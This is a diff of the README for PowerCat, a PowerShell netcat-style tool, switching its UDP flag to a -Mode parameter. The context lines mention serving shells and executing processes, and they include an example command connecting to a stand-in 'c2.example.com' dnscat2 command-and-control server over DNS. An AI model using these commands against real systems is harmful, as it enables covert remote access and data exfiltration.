@@ -22,7 +22,7 @@ PowerCat is a PowerShell module.  First you need to import the module before you
     -Execute        Execute a process.                                  [String]
     -PowerShell     Execute Powershell.                                 [Switch]
     -Relay          Format: "-r tcp:10.1.1.1:443"                       [String]
-    -Udp            Transfer data over UDP.                             [Switch]
+    -Mode           Defaults to Tcp, can also specify Udp               [String]
     -Timeout        Timeout option. Default: 60                         [Int]
     -Input          Filepath (string), byte array, or string.           [Object]
     -OutputType     Console Output Type: "Host", "Bytes", or "String"   [String]
@@ -75,10 +75,10 @@ PowerCat can be used to send and serve shells. Specify an executable to -Execute
 
 DNS and UDP
 -----------
-PowerCat supports more than sending data over TCP. Specify the -Udp paratmeter to enable UDP Mode. Data can also be sent to a [dnscat2 server](https://github.com/iagox86/dnscat2) via Invoke-DnsCat.
+PowerCat supports more than sending data over TCP. Specify -Mode Udp to enable UDP Mode. Data can also be sent to a [dnscat2 server](https://github.com/iagox86/dnscat2) via Invoke-DnsCat.
 ###
     Send Data Over UDP:
-        Invoke-PowerCat -Listener -Port 8000 -Udp
+        Invoke-PowerCat -Listener -Port 8000 -Mode Udp
         
     Connect to the c2.example.com dnscat2 server using the DNS server on 10.1.1.1:
         Invoke-DnsCat -Client 10.1.1.1 -Port 53 -Server c2.example.com
